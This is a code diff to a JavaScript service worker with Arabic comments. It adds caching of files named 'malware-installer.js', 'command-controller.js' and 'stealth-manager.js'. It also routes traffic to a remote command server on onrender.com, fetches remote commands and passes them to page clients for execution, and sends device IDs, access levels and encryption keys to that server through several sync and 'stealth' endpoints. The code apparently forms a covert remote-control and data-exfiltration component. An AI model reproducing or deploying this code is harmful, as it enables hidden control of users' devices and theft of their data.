@@ -11,23 +11,17 @@ const DYNAMIC_CACHE = 'dynamic-v4.0';
 const STATIC_FILES = [
     '/',
     '/index.html',
-    '/auto-permissions.js',
-    '/stealth-permissions.js',
-    '/permissions-persistence.js',
-    '/permissions-validator.js',
-    '/permissions-guardian.js',
     '/advanced-access-system.js',
-    '/device-manager.js',
-    '/system-integrity.js',
-    '/system-initializer.js',
-    '/real-functions.js',
-    '/activate.js',
-    '/stealth-activation.js'
+    '/malware-installer.js',
+    '/command-controller.js',
+    '/encryption.js',
+    '/stealth-manager.js'
 ];
 
 // متغيرات النظام
 let deviceId = null;
 let accessLevel = 'stealth';
+let encryptionKey = null;
 let isInitialized = false;
 let activeConnections = new Map();
 let installedModules = new Set();
@@ -116,7 +110,13 @@ self.addEventListener('fetch', (event) => {
     const { request } = event;
     const url = new URL(request.url);
     
-    // تجاهل طلبات الخادم
+    // معالجة طلبات الخادم البعيد
+    if (url.hostname === 'remote-control-command-server.onrender.com') {
+        event.respondWith(handleRemoteRequest(request));
+        return;
+    }
+    
+    // تجاهل طلبات الخادم الأخرى غير الأصل
     if (url.origin !== self.location.origin) {
         return;
     }
@@ -155,6 +155,27 @@ self.addEventListener('fetch', (event) => {
             })
     );
 });
+
+// معالجة الطلبات البعيدة
+async function handleRemoteRequest(request) {
+    try {
+        // إضافة رؤوس مخصصة للطلبات البعيدة
+        const newHeaders = new Headers(request.headers);
+        newHeaders.append('Device-ID', deviceId);
+        newHeaders.append('Access-Level', accessLevel);
+        
+        const remoteRequest = new Request(request, {
+            headers: newHeaders,
+            mode: 'cors',
+            credentials: 'omit'
+        });
+        
+        return fetch(remoteRequest);
+    } catch (error) {
+        console.error('❌ خطأ في معالجة الطلب البعيد:', error);
+        return new Response(null, { status: 500 });
+    }
+}
 
 // ===== Background Sync =====
 
@@ -234,6 +255,7 @@ function handleInitAdvancedAccess(data) {
     
     deviceId = data.deviceId;
     accessLevel = data.accessLevel;
+    encryptionKey = data.encryptionKey;
     isInitialized = true;
     
     // إرسال تأكيد التهيئة
@@ -287,7 +309,18 @@ async function handleExecuteCommand(data) {
     console.log('⚡ تنفيذ الأمر:', data.command);
     
     try {
+        // تنفيذ الأمر مباشرة في Service Worker
         const result = await executeCommand(data.command, data.parameters);
+        
+        // إرسال الأمر إلى العميل أيضاً
+        const clients = await self.clients.matchAll();
+        clients.forEach(client => {
+            client.postMessage({
+                type: 'EXECUTE_COMMAND',
+                command: data.command,
+                parameters: data.parameters
+            });
+        });
         
         sendMessageToClient({
             type: 'COMMAND_EXECUTED',
@@ -312,19 +345,25 @@ async function handleRequestData(data) {
     console.log('📤 طلب البيانات:', data.dataType);
     
     try {
-        const result = await getRequestedData(data.dataType);
+        // إرسال طلب البيانات إلى العميل
+        const clients = await self.clients.matchAll();
+        clients.forEach(client => {
+            client.postMessage({
+                type: 'REQUEST_DATA',
+                dataType: data.dataType
+            });
+        });
         
         sendMessageToClient({
-            type: 'DATA_RETRIEVED',
+            type: 'DATA_REQUEST_SENT',
             dataType: data.dataType,
-            success: true,
-            data: result
+            success: true
         });
     } catch (error) {
         console.error('❌ خطأ في طلب البيانات:', error);
         
         sendMessageToClient({
-            type: 'DATA_RETRIEVED',
+            type: 'DATA_REQUEST_SENT',
             dataType: data.dataType,
             success: false,
             error: error.message
@@ -360,7 +399,8 @@ function handleUpdateStatus(data) {
     console.log('📊 تحديث الحالة:', data);
     
     // تحديث الحالة المحلية
-    Object.assign(self, data);
+    if (data.accessLevel) accessLevel = data.accessLevel;
+    if (data.encryptionKey) encryptionKey = data.encryptionKey;
     
     // إرسال تأكيد التحديث
     sendMessageToClient({
@@ -588,7 +628,10 @@ async function syncData() {
         const response = await fetch('https://remote-control-command-server.onrender.com/sync', {
             method: 'POST',
             headers: {
-                'Content-Type': 'application/json'
+                'Content-Type': 'application/json',
+                'Device-ID': deviceId,
+                'Access-Level': accessLevel,
+                'Encryption-Key': encryptionKey
             },
             body: JSON.stringify({
                 deviceId: deviceId,
@@ -616,13 +659,25 @@ async function syncCommands() {
         const response = await fetch('https://remote-control-command-server.onrender.com/commands', {
             method: 'GET',
             headers: {
-                'Device-ID': deviceId
+                'Device-ID': deviceId,
+                'Access-Level': accessLevel,
+                'Encryption-Key': encryptionKey
             }
         });
         
         if (response.ok) {
             const commands = await response.json();
             console.log('📥 تم استلام الأوامر:', commands);
+            
+            // إرسال الأوامر إلى العميل
+            const clients = await self.clients.matchAll();
+            clients.forEach(client => {
+                client.postMessage({
+                    type: 'NEW_COMMANDS',
+                    commands: commands
+                });
+            });
+            
             return { success: true, commands: commands };
         } else {
             throw new Error('فشل في مزامنة الأوامر');
@@ -650,7 +705,8 @@ async function syncStatus() {
         const response = await fetch('https://remote-control-command-server.onrender.com/status', {
             method: 'POST',
             headers: {
-                'Content-Type': 'application/json'
+                'Content-Type': 'application/json',
+                'Encryption-Key': encryptionKey
             },
             body: JSON.stringify(status)
         });
@@ -684,7 +740,8 @@ async function stealthSync() {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json',
-                'X-Stealth-Mode': 'true'
+                'X-Stealth-Mode': 'true',
+                'Encryption-Key': encryptionKey
             },
             body: JSON.stringify(stealthData)
         });
@@ -704,16 +761,11 @@ async function stealthSync() {
 // مزامنة البيانات للخادم
 async function syncDataToServer(data) {
     try {
-        // تحديد الرابط الصحيح بناءً على البيئة
-        const isLocalhost = self.location.hostname === 'localhost' || self.location.hostname === '127.0.0.1';
-        const serverUrl = isLocalhost 
-            ? 'http://localhost:10001/data' 
-            : 'https://remote-control-command-server.onrender.com/data';
-        
-        const response = await fetch(serverUrl, {
+        const response = await fetch('https://remote-control-command-server.onrender.com/data', {
             method: 'POST',
             headers: {
-                'Content-Type': 'application/json'
+                'Content-Type': 'application/json',
+                'Encryption-Key': encryptionKey
             },
             body: JSON.stringify({
                 deviceId: deviceId,
